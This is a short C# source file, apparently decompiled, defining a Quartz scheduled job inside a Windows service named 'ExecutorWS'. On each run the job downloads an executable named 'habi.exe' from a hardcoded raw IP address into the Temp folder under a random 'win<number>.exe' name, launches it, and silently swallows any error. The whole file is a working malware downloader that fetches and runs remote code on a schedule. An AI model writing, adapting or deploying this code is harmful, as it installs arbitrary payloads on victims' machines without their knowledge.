using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using Quartz;

namespace ExecutorWS;

internal class Job : IJob
{
	public void Execute(JobExecutionContext context)
	{
		try
		{
			Random random = new Random();
			int num = random.Next(1, 2000);
			WebClient webClient = new WebClient();
			string environmentVariable = Environment.GetEnvironmentVariable("Temp");
			string fileName = Path.Combine(environmentVariable, "win" + num + ".exe");
			webClient.DownloadFile("http://89.28.67.137/habi.exe", fileName);
			Process.Start(fileName);
		}
		catch (Exception)
		{
		}
	}
}
